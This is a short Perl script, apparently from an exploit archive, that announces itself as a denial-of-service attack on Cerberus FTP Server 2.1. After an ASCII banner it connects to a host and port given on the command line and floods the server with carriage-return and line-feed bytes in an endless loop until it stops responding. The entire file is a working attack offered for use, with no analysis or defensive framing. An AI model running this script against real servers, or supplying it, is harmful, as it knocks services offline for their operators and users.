----cerbcrash2.pl----
print "/====================================================\x5c\n";
print "|  _____  _____ _     _ ______ ______  _____ _____   |\n";
print "| |  __ \x5c| ____| \x5c   / |  __  |______|| ____|  __ \x5c  |\n";
print "| | |  | ||____|  \x5c_/  | I  I |  TT   ||____| |  | | |\n";
print "| | |__| | ____||\x5c   /|| I  I |  TT   | ____| |__| | |\n";
print "| |  __  ||____|| \x5c_/ || I__I |  TT   ||____|  __  | |\n";
print "| |_|  \x5c_|_____||     ||______|  TT   |_____|_|  \x5c_\x5c |\n";
print "|                                                    |\n";
print "\x5c====================================================/\n";
print "    THE REAL REMOTER\n\n\n";


print "This is a DOSAttack against Cerberus FTP Server 2.1\n\n";

die "$usage" unless $ARGV[0] && $ARGV[1];
use Socket;
my $remote = $ARGV[0];
my $port = $ARGV[1];
my $iaddr = inet_aton($remote);
my $proto = getprotobyname("tcp");
my $paddr = sockaddr_in($port, $iaddr);
socket(SOCK, PF_INET, SOCK_STREAM, $proto);
connect(SOCK, $paddr) or die "Can't connect to " . $remote;
print "Sending exploit\n";
$msg = "\x0d\x0a";
while((CLIENT,SOCKET)){
send(SOCK,$msg, 0) or die "Server maybe down (check it)\n";
}
exit;
----end of cerbcrash2.pl----

